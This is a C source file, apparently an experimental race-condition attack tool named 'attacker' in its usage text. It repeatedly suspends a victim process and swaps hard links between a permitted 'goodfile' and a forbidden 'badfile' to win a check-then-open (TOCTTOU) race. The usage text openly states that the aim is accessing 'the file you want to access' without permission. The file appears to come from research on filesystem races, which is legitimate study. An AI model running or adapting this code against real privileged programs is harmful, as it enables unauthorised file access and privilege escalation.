#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <sched.h>


int krounds;

char *filenames[1<<25];
int nfilenames;

struct stat test;
struct timespec rqtp;
struct timespec rmtp;

struct timeval tv;

void load_filenames(char *namelistfile)
{
	FILE *f;
	
	if ((f = fopen(namelistfile, "r")) == NULL) {
		perror("Couldn't open filename list file");
		exit(1);
	}
	nfilenames = 0;
	while(fscanf(f, "%as\n", &filenames[nfilenames]) != EOF)
		nfilenames++;
}

#define OP_CREATE 0
#define OP_DELETE 1

int semid;
int nfiles;
int current_operation;
int current_filename;
char *current_target;

void * threadfunc(void * dummy)
{
	struct sembuf sop;

	sop.sem_num = 0;
	sop.sem_op = -1;
	sop.sem_flg = 0;

	while (1) {

		if (semop(semid, &sop, 1)) {
			perror("Couldn't sleep on semaphore\n");
			pthread_exit(NULL);
		}

		switch (current_operation) {

		case OP_CREATE:
			link(current_target, filenames[current_filename++]);
			break;

		case OP_DELETE:
			unlink(filenames[--current_filename]);
			break;

		default:
			fprintf(stderr, "Unknown current_operation\n");
		}
		
		if (current_filename == 0)
			current_operation = OP_CREATE;
	}

	return NULL;
}

long long tv2usecs(struct timeval *tv)
{
	return tv->tv_sec * 1000000ULL + tv->tv_usec;
}

pthread_t threads[1<17];



void firstswitchto (int method, pid_t victimpid, char *tgt)
{
		struct timeval tv;
		int i;
		
		

		if (victimpid && kill(victimpid, SIGSTOP)) {
			perror("Couldn't stop victim");
			exit(1);
		}
		gettimeofday(&tv, NULL);
		printf("%18lld STOPPED\n", tv2usecs(&tv));
		
	
		for (i = nfiles - 1; i >= 0; i--)
			unlink(filenames[i]); // Ignore failures here
			
		if (link(tgt, filenames[nfiles-1])) {
				perror("Couldn't create link");
				exit(1);
			}
	/*
		for (i = 0; i < nfiles; i++)
			if (link(tgt, filenames[i])) {
				perror("Couldn't create link");
				exit(1);
			}
	*/

		gettimeofday(&tv, NULL);
		printf("%18lld CONTED\n", tv2usecs(&tv));
		
		
		
		if (victimpid &&	kill(victimpid, SIGCONT)) {
			perror("Couldn't continue victim");
			exit(1);
		}
}


void switchto(int method, pid_t victimpid, char *tgt)
{
	if (method == 0) {
//		int i;
		struct timeval tv;
		
		

		if (victimpid && kill(victimpid, SIGSTOP)) {
			perror("Couldn't stop victim");
			exit(1);
		}
		gettimeofday(&tv, NULL);
		printf("%18lld STOPPED\n", tv2usecs(&tv));
		
	
		int n;
		unsigned long long x1;
		unsigned long long x2;
		

	
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		//lstat(filenames[nfiles-1],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		//printf("filenames[n-1] before unlink costs %lld\n", x2-x1);

		for(n=nfiles*krounds;n<nfiles*(krounds+1);n++)
			lstat(filenames[n],&test);
			 	
		unlink(filenames[nfiles-1]);
		
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		//lstat(filenames[nfiles-1],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		//printf("filenames[n-1] after unlink costs %lld\n", x2-x1);
		
		
		
		
		if (link(tgt, filenames[nfiles-1])) {
			perror("Couldn't create link");
			exit(1);
		}
		
			
			
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[nfiles-1],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[n-1] after link costs %lld\n", x2-x1);
		
/*			
		for (i = nfiles - 1; i >= 0; i--)
			unlink(filenames[i]); // Ignore failures here
		for (i = 0; i < nfiles; i++)
			if (link(tgt, filenames[i])) {
				perror("Couldn't create link");
				exit(1);
			}
*/	
	///////////////// test head or tail ////////////////////
	//	unsigned long long x1;
	//	unsigned long long x2;
		
	/*	gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[0],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[0] costs %lld\n", x2-x1);
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[1],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);
		printf("filenames[1] costs %lld\n", x2-x1);
		
		
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[2],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[2] costs %lld\n", x2-x1);
		
*/		
		
/*		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[nfiles-3000],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[n-3000] costs %lld\n", x2-x1);

*/		
/*		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[nfiles-5],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[n-5] costs %lld\n", x2-x1);
		
		
		
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[nfiles-3],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[n-3] costs %lld\n", x2-x1);	
		
			
		
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[nfiles-2],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);
		printf("filenames[nfiles-2] costs %lld\n", x2-x1);
		
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[nfiles-1],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[nfiles-1] costs %lld\n", x2-x1);
*/		
	///////////////// test finishes /////////////////
	
	//	if (victimpid) {
	//		sleep(10);
	//	}

	//	sched_yield();
		gettimeofday(&tv, NULL);
		printf("%18lld CONTED\n", tv2usecs(&tv));
		
	//	sleep(30);
		
		
		if (victimpid &&	kill(victimpid, SIGCONT)) {
			perror("Couldn't continue victim");
			exit(1);
		}
	//	sched_yield();
	} else {
		struct sembuf sop;
		
		sop.sem_num = 0;
		sop.sem_op = 2*nfiles;
		sop.sem_flg = 0;
		
		current_operation = OP_DELETE;
		current_filename = nfiles;
		current_target = tgt;
		
		if (semop(semid, &sop, 1)) {
			perror("Couldn't awaken the thundering herd\n");
			exit(0);
		}
	}
}



void lastswitchto(int method, pid_t victimpid, char *tgt)
{


		struct timeval tv;
		
		

		if (victimpid && kill(victimpid, SIGSTOP)) {
			perror("Couldn't stop victim");
			exit(1);
		}
		gettimeofday(&tv, NULL);
		printf("%18lld STOPPED\n", tv2usecs(&tv));
		

	
		int n;
		long long x1;
		long long x2;
		
	//	for(n=nfiles-2;n>=0;n--)
	//		lstat(filenames[n],&test);	

			
		unlink(filenames[nfiles-1]);
		if (link(tgt, filenames[nfiles-1])) {
			perror("Couldn't create link");
			exit(1);
		}
		
		krounds++;
		
		for(n=nfiles*krounds+1;n<nfiles*(krounds+1);n++)
			unlink(filenames[n]);
		
			
		
		gettimeofday(&tv, NULL);
		x1=tv2usecs(&tv);
		
		lstat(filenames[nfiles-1],&test);
		
		gettimeofday(&tv, NULL);
		x2=tv2usecs(&tv);		
		printf("filenames[n-1] after link in lastswitch costs %lld\n", x2-x1);
		
		


		gettimeofday(&tv, NULL);
		printf("%18lld CONTED\n", tv2usecs(&tv));
		

		
		
		if (victimpid &&	kill(victimpid, SIGCONT)) {
			perror("Couldn't continue victim");
			exit(1);
		}
 
}


int main(int argc, char **argv)
{
	int debug;
	int sched;
	char *namelistfile;
	char *basedir;
	char *goodfile;
	char *badfile;
	char *victim_args[argc];
	int i;
	pid_t victimpid = 0;
	
//	int forkreturn=1;

	krounds=0;
	
	if (argc < 8) {
		printf("attacker <debug> <sched> <namelist> <basedir> <nfiles> <goodfile> <badfile> <victim> <victim args>\n"
					 "debug:       0 = no debugging, 1 = debugging\n"
					 "sched:       0 = suspend victim to do work\n"
					 "             1 = use many threads to do work (experimental)\n"
					 "namelist:    name of file containing list of filenames to use\n"
					 "basedir:     attack files will be created in this directory\n"
					 "nfiles:      number of files to be used in attacks\n"
					 "goodfile:    the file you are allowed to access\n"
					 "badfile:     the file you want to access\n"
					 "victim:      victim executable\n"
					 "\n"
					 "Note: victim will be executed a \"victim victim_args path\n"
					 "Note: goodfile, badfile, victim, and victim's arguments\n"
					 "      must be absolute paths or relative to basedir.\n");
		
		exit(0);
	}

	debug = atoi(argv[1]);
	sched = atoi(argv[2]);
	namelistfile = argv[3];
	basedir = argv[4];
	nfiles = atoi(argv[5]);
	goodfile = argv[6];
	badfile = argv[7];
	for (i = 0; i < argc - 8; i++)
    victim_args[i] = argv[i + 8];
	load_filenames(namelistfile);
//  	victim_args[i++] = filenames[0];
 	victim_args[i++] = filenames[nfiles-1];
  	victim_args[i++] = NULL;

	if (sched) {
		if ((semid = semget(12323, 1, IPC_CREAT | S_IRWXU)) < 0) {
			perror("Couldn't set up semaphore\n");
			exit(0);
		}
		if (semctl(semid, 0, SETVAL, 0) < 0) {
			perror("Couldn't init semaphore\n");
			exit(0);
		}
		for (i = 0; i < 2*nfiles; i++)
			if (pthread_create(&threads[i], NULL, threadfunc, NULL) != 0) {
				perror("Couldn't create thread\n");
				exit(0);
			}
		sleep(1);
	}

	if (chdir(basedir)) {
		perror("Couldn't switch to basedir");
		exit(1);
	}

////////////////////////////////////////////// test of switch to begins ///////////////////////
/*
			switchto(sched, victimpid, badfile);
			access(filenames[nfiles-1],R_OK);
			switchto(sched, victimpid, goodfile);
			access(filenames[nfiles-1],R_OK);
			switchto(sched, victimpid, badfile);
			access(filenames[nfiles-1],R_OK);
			switchto(sched, victimpid, goodfile);
			access(filenames[nfiles-1],R_OK);
			
		exit(0);


*/

///////////////////////////////////////////// test of switch to ends ////////////////////////



//	printf("before first switch vic pid = %d\n",victimpid);
	firstswitchto(sched, victimpid, badfile);	
	if (sched)
		sleep(1);
	
//	printf("after first switch filename= %s\n",filenames[nfiles-1]);
		
//	unsigned long mask=1;
//	unsigned int len = sizeof(mask);
	
//	if (sched_setaffinity(0, len, &mask) < 0) {
//    	perror("sched_setaffinity");
//	}
	
	rqtp.tv_sec=0;
	rqtp.tv_nsec=500000;	
	
//	if(0!=nanosleep(&rqtp,&rmtp))
//		perror("cannot nanosleep!!!");
	
//	sleep(900);
	
	victimpid=fork();
	
	if(victimpid==0){
		
		sched_yield();
		nice(20);
    	execvp(victim_args[0], victim_args);
    	perror("execvp");
    	return 1;
	}
	
	else if (victimpid == -1) {
		perror("Couldn't fork");
		exit(1);
	}

/*	
  if ((victimpid = fork()) == 0) {
    // Victim
  //  if(0!=nanosleep(&rqtp,&rmtp))
	//	perror("cannot nanosleep!!!");
		
    execvp(victim_args[0], victim_args);
    perror("execvp");
    return 1;
  } else if (victimpid == -1) {
		perror("Couldn't fork");
		exit(1);
	}
*/
//	usleep(500);
	
	
	unsigned long long x1;
	unsigned long long x2;
	
	gettimeofday(&tv, NULL);
	x1=tv2usecs(&tv);
	
		
	if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
		
	gettimeofday(&tv, NULL);
	x2=tv2usecs(&tv);
	
	printf("%18lld before first nanosleep\n%18lld after first nanosleep\n",x1,x2);

	unsigned long long a1=0;
	unsigned long long a2=0;
	unsigned long long a3=0;
//	unsigned long long a4=0;
 
 	
	
	while(1) {
		// VICTIM: lstat
		gettimeofday(&tv, NULL);
		a1=tv2usecs(&tv);
		
//		printf("vic pid = %d\n",victimpid);
		
		switchto(sched, victimpid, goodfile);
		
		
		if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
		
		// VICTIM: access
		
		gettimeofday(&tv, NULL);
		a2=tv2usecs(&tv);
		
//		printf("vic pid = %d\n",victimpid);
		switchto(sched, victimpid, badfile);
		
		if(0!=nanosleep(&rqtp,&rmtp))
		perror("cannot nanosleep!!!");
		// VICTIM: open
		
		gettimeofday(&tv, NULL);
		a3=tv2usecs(&tv);
		
//		printf("vic pid = %d\n",victimpid);
		lastswitchto(sched, victimpid, badfile);
		
		if(0!=nanosleep(&rqtp,&rmtp))
			perror("cannot nanosleep!!!");
		
	//	printf("after second switch filename= %s\n",filenames[nfiles-1]);
	//	printf("%18lld should after lstate\n%18lld should after access\n%18lld should after open\n",a1,a2,a3);
		
	//	sched_yield();
		// VICTIM: fstat
		// VICTIM: close (except on first iteration)
		
	//	exit(0);
	}

	return 0;
}
